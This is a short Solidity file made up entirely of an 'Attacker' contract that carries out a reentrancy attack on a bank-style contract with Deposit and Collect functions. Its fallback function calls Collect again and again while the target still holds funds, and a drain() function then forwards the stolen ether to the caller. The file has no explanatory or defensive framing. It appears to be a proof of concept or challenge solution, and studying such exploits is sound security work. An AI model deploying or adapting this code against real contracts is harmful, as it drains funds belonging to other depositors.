pragma solidity ^0.4.26;

interface IBank {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}
contract Attacker {
    IBank public bank;
    uint public amount;
    bool internal attacking;

    constructor(address _bank) public {
        bank = IBank(_bank);
    }
    function attack() public payable {
        require(msg.value > 0);
        amount = msg.value;     
        bank.Deposit.value(msg.value)();  
        attacking = true;
        bank.Collect(amount);     
        attacking = false;
    }
    function() public payable {
        if (attacking && address(bank).balance >= amount) {
            bank.Collect(amount); 
        }
    }
    function drain() public {
        msg.sender.transfer(address(this).balance);
    }
}
